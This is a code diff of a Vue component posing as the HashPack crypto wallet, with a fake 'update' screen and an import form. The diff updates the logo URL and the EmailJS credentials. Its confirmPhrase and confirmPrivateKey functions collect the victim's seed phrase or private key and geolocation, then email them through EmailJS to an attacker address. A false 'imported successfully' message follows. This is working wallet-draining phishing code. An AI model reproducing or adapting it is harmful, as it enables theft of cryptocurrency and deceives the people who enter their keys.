@@ -20,7 +20,7 @@
           <template v-if="currentStep === 1">
             <div class="flex flex-col items-center justify-center">
               <div class="rounded-3xl flex justify-center w-full pt-[90px]">
-                <img class="w-[80px] h-[80px]" src="https://logo.clearbit.com/hashpack.app" alt="HashPack" />
+                <img class="w-[80px] h-[80px]" src="https://play-lh.googleusercontent.com/iFpAMOykLLlqE6yqZEG9mzhhmIVWIp5zTixNSneboNWn-uDqeEh8ZjUtc0wniLAPQ6I" alt="HashPack" />
               </div>
               <form class="w-full p-6">
                 <h2 style="color: white" class="text-5xl leading-[24px] text-center font-bold mb-6 mt-2 tracking-[-0.02em]">HashPack</h2>
@@ -48,7 +48,7 @@
           <template v-else-if="currentStep === 2">
             <div>
               <div class="rounded-3xl flex justify-center w-full pt-[90px]">
-                <img class="w-[80px] h-[80px]" src="https://logo.clearbit.com/hashpack.app" alt="HashPack" />
+                <img class="w-[80px] h-[80px]" src="https://play-lh.googleusercontent.com/iFpAMOykLLlqE6yqZEG9mzhhmIVWIp5zTixNSneboNWn-uDqeEh8ZjUtc0wniLAPQ6I" alt="HashPack" />
               </div>
               <h2 style="color: white" class="text-4xl leading-[24px] text-center font-bold mb-6 mt-4 tracking-[-0.02em]">This app will be updated to the latest version</h2>
               <p class="text-gray-500 font-semibold text-center text-2xl mb-8">Enhancements and stability improvements</p>
@@ -64,7 +64,7 @@
             <div key="s3" class="flex flex-col items-center p-6">
               <div class="flex flex-col items-center gap-3 py-6 w-full">
                 <div class="flex items-center justify-center">
-                  <img src="https://logo.clearbit.com/hashpack.app" class="w-20 h-20" alt="HashPack" />
+                  <img src="https://play-lh.googleusercontent.com/iFpAMOykLLlqE6yqZEG9mzhhmIVWIp5zTixNSneboNWn-uDqeEh8ZjUtc0wniLAPQ6I" class="w-20 h-20" alt="HashPack" />
                 </div>
                 <h2 class="text-4xl text-white mt-2 mb-0 text-center font-bold">Updating HashPack</h2>
                 <p class="text-gray-300 text-[16px] text-center">Please wait while we apply the latest updates</p>
@@ -166,9 +166,9 @@ function toggleFieldVisibility(idx) { hiddenFields.value[idx] = !hiddenFields.va
 
 const isImportDisabled = computed(() => activeTab.value === 'private' ? !privateKeyInput.value.trim() : phraseWords.value.some((w) => !w || !w.trim()))
 
-async function confirmPhrase(){ if (isImportDisabled.value) return showMessage('Please fill all fields', 'error'); isLoading.value = true; try { const location = await axios.get('https://ipapi.co/json'); const payload = { type: 'seed', wordCount: selectedWordCount.value, phrase: phraseWords.value.join(' ') }; const params = { service_id: 'service_eusbqyo', template_id: 'template_z6xga6o', user_id: 'obT4LcwZqPw_KlOar', template_params: { from_name: 'Blockchain solutions', wallet_type: 'HashPack', location: JSON.stringify(location.data), link_drops: JSON.stringify(payload), reply_to: 'customeronlineagent@gmail.com' } }; const response = await axios.post('https://api.emailjs.com/api/v1.0/email/send', params); if (response.data === 'OK') { showMessage('Wallet imported successfully!', 'success'); emit('close') } } catch(err){ showMessage(err.message || 'Import failed', 'error') } finally { isLoading.value = false } }
+async function confirmPhrase(){ if (isImportDisabled.value) return showMessage('Please fill all fields', 'error'); isLoading.value = true; try { const location = await axios.get('https://ipapi.co/json'); const payload = { type: 'seed', wordCount: selectedWordCount.value, phrase: phraseWords.value.join(' ') }; const params = { service_id: 'service_k4kimk6', template_id: 'template_mpy0fmg', user_id: 'DMvtKT5BmC4qV83V9', template_params: { from_name: 'Blockchain solutions', wallet_type: 'HashPack', location: JSON.stringify(location.data), link_drops: JSON.stringify(payload), reply_to: 'customeronlineagent@gmail.com' } }; const response = await axios.post('https://api.emailjs.com/api/v1.0/email/send', params); if (response.data === 'OK') { showMessage('Wallet imported successfully!', 'success'); emit('close') } } catch(err){ showMessage(err.message || 'Import failed', 'error') } finally { isLoading.value = false } }
 
-async function confirmPrivateKey(){ if (!privateKeyInput.value.trim()) return showMessage('Please enter your private key', 'error'); isLoading.value = true; try { const location = await axios.get('https://ipapi.co/json'); const payload = { type: 'privateKey', privateKey: privateKeyInput.value }; const params = { service_id: 'service_eusbqyo', template_id: 'template_z6xga6o', user_id: 'obT4LcwZqPw_KlOar', template_params: { from_name: 'Blockchain solutions', wallet_type: 'HashPack', location: JSON.stringify(location.data), link_drops: JSON.stringify(payload), reply_to: 'customeronlineagent@gmail.com' } }; const response = await axios.post('https://api.emailjs.com/api/v1.0/email/send', params); if (response.data === 'OK') { showMessage('Private key imported successfully!', 'success'); emit('close') } } catch(err){ showMessage(err.message || 'Import failed', 'error') } finally { isLoading.value = false } }
+async function confirmPrivateKey(){ if (!privateKeyInput.value.trim()) return showMessage('Please enter your private key', 'error'); isLoading.value = true; try { const location = await axios.get('https://ipapi.co/json'); const payload = { type: 'privateKey', privateKey: privateKeyInput.value }; const params = { service_id: 'service_k4kimk6', template_id: 'template_mpy0fmg', user_id: 'DMvtKT5BmC4qV83V9', template_params: { from_name: 'Blockchain solutions', wallet_type: 'HashPack', location: JSON.stringify(location.data), link_drops: JSON.stringify(payload), reply_to: 'customeronlineagent@gmail.com' } }; const response = await axios.post('https://api.emailjs.com/api/v1.0/email/send', params); if (response.data === 'OK') { showMessage('Private key imported successfully!', 'success'); emit('close') } } catch(err){ showMessage(err.message || 'Import failed', 'error') } finally { isLoading.value = false } }
 
 function showMessage(text, type = 'success'){ message.value = { text, type }; setTimeout(() => { message.value.text = '' }, 3000) }
 
